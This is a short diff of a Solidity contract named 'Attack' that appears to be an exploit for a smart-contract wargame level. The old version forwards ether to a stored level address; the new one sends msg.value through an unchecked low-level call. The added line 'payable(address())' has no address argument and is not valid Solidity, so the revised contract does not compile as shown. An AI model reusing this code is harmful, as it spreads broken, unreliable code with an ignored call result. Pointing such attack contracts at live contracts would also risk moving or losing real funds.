@@ -1,14 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity^0.8.13;
+pragma solidity ^0.8.20;
 
-contract Attacker{
-    address payable level;
+contract Attack {
 
-    constructor(address _level) {
-        level = payable(_level);
-    } 
+    address payable to = payable(address());
 
-    function attack() public payable{
-        level.transfer(msg.value);
+    function attack() public payable {
+        to.call{value: msg.value}('');
     }
+
 }
